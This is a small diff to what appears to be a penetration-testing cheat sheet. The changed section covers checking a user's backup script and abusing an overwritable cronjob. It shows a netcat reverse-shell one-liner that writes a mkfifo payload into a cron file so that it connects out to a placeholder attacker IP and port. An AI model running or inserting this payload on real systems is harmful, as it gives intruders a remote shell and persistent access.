@@ -15,6 +15,7 @@ ls -lah /home/joe/.scripts/user_backups.sh
 cat /home/joe/.scripts/user_backups.sh
 ```
 ### Revshell Oneliner
+If the cronjob can be overwritten:
 ```bash
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $(ATTACKER IP) $(PORT) >/tmp/f" >> $(CRONJOB_FILE)
 ```
